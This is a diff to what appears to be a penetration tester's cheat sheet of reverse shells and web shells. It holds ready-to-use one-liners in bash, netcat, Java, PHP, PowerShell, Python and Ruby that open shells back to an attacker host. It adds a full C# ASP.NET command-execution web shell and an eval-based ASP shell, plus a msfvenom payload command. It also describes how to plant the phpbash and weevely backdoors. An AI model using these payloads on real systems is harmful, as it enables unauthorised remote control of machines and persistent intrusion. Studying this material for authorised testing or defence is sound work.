@@ -38,10 +38,13 @@ After that, on the victim's machine, you can launch the reverse shell connection
 
 A Reverse Shell is handy when we want to get a quick, reliable connection to our compromised host. However, a Reverse Shell can be very fragile. Once the reverse shell command is stopped, or if we lose our connection for any reason, we would have to use the initial exploit to execute the reverse shell command again to regain our access.
 
+## Seclist reverse shells
 
-## Reverse shell connections
+Located under `/usr/share/seclists/Web-Shells` folder. 
 
-### bash
+
+
+## bash
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/$ipAttacker/$port 0>&1'
@@ -67,7 +70,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.79 4321 >/tmp/f
 
 ```
 
-### java
+## java
 
 ```bash
 r = Runtime.getRuntime()
@@ -75,8 +78,68 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$ipAttacker/$port;cat <&5 | while
 p.waitFor()
 ```
   
+## .NET ASP
 
-### netcat
+The basic one:
+
+```asp
+<% eval request('cmd') %>
+```
+
+Some from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP): 
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.ashx
+
+```asp
+<% @ webhandler language="C#" class="AverageHandler" %>
+
+using System;
+using System.Web;
+using System.Diagnostics;
+using System.IO;
+
+public class AverageHandler : IHttpHandler
+{
+  /* .Net requires this to be implemented */
+  public bool IsReusable
+  {
+    get { return true; }
+  }
+
+  /* main executing code */
+  public void ProcessRequest(HttpContext ctx)
+  {
+    Uri url = new Uri(HttpContext.Current.Request.Url.Scheme + "://" +   HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);
+    string command = HttpUtility.ParseQueryString(url.Query).Get("cmd");
+
+    ctx.Response.Write("<form method='GET'>Command: <input name='cmd' value='"+command+"'><input type='submit' value='Run'></form>");
+    ctx.Response.Write("<hr>");
+    ctx.Response.Write("<pre>");
+
+    /* command execution and output retrieval */
+    ProcessStartInfo psi = new ProcessStartInfo();
+    psi.FileName = "cmd.exe";
+    psi.Arguments = "/c "+command;
+    psi.RedirectStandardOutput = true;
+    psi.UseShellExecute = false;
+    Process p = Process.Start(psi);
+    StreamReader stmrdr = p.StandardOutput;
+    string s = stmrdr.ReadToEnd();
+    stmrdr.Close();
+
+    ctx.Response.Write(System.Web.HttpUtility.HtmlEncode(s));
+    ctx.Response.Write("</pre>");
+    ctx.Response.Write("<hr>");
+    ctx.Response.Write("By <a href='http://www.twitter.com/Hypn'>@Hypn</a>, for educational purposes only.");
+ }
+}
+```
+
+See [shell.asa](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.asa "shell.asa"), [shell.asmx](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.asmx "shell.asmx"), [shell.asp](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.asp "shell.asp"), [shell.aspx](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.aspx "shell.aspx"), [shell.cer](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.cer "shell.cer"), [shell.soap](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.soap "shell.soap"), [shell.xamlx](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.xamlx "shell.xamlx").
+
+
+
+## netcat
 
 ```bash
 nc -e /bin/sh $ipAttacker $port
@@ -84,7 +147,7 @@ nc -e /bin/sh $ipAttacker $port
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ipAttacker $port >/tmp/f
 ```
 
-### nishang project
+## nishang project
 
 
 Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming.  Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. [See nishang](nishang.md)
@@ -207,13 +270,35 @@ https://github.com/samratashok/nishang
 }
 ```
 
-### php
+## php
 
 ```bash
 php -r '$sock=fsockopen("$ipAttacker",$port);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-### powershell
+### Pentestmonkey
+
+Also, the [pentestmonkey one](pentesmonkey.md).
+
+### weevely
+
+[Weevely](weevely.md) is **a stealth PHP web shell that simulate telnet-like connection**. It is an essential tool for web application post exploitation, and can be used as stealth backdoor or as a web shell to manage legit web accounts, even free hosted ones.
+
+### phpbash
+
+phpbash is a standalone, semi-interactive web shell. It's main purpose is to assist in penetration tests where traditional reverse shells are not possible. The design is based on the default Kali Linux terminal colors, so pentesters should feel right at home.
+
+Installation:
+
+```
+git clone https://github.com/Arrexel/phpbash.git
+```
+
+Simply drop the `phpbash.php` or `phpbash.min.php` file on the target and access it with any Javascript-enabled web browser.
+
+![](img/phpbash.png)
+
+## powershell
 
 ```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient($ipAttacker,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
@@ -259,7 +344,7 @@ Disable AV
 ```
 
 
-### python
+## python
 
 ```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ipAttacker",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -268,15 +353,24 @@ python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ```
 
-### ruby
+## ruby
 
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("$ipAttacker",$port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
-### xterm
+## xterm
 
 ```bash
 xterm -display 10.0.0.1:1
 ```
 
+
+## msfvenom
+
+[See msfvenom](msfvenom.md)
+
+
+```shell-session
+msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
+```
